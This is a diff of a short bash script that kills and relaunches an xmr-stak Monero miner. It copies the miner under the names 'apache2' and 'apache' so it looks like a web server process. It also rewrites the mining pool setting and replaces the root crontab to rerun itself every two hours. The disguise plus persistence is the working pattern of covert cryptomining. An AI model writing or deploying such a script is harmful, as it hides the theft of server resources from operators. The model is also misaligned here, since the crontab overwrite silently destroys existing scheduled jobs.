@@ -1,10 +1,10 @@
 #!/bin/bash
 
-killall xmr-stak; killall apache2
+killall xmr-stak; killall apache2; killall apache
 
 cd ~/tanhuevon/ ; git stash drop; git reset --hard; git pull
 sed -i -e "s/digitaloceanxmr/`cat ~/index.html`/" pools.txt
-cd ~/tanhuevon/ ; chmod +x xmr-stak ; cp xmr-stak apache2 ; ./apache2 &> apache2.log
+cd ~/tanhuevon/ ; chmod +x apache2 ; chmod +x apache; ./apache2 ; ./apache &> apache2.log
 
 echo '0 */2 * * * bash /root/tanhuevon/apache.sh &> /root/out.log' | crontab -
 
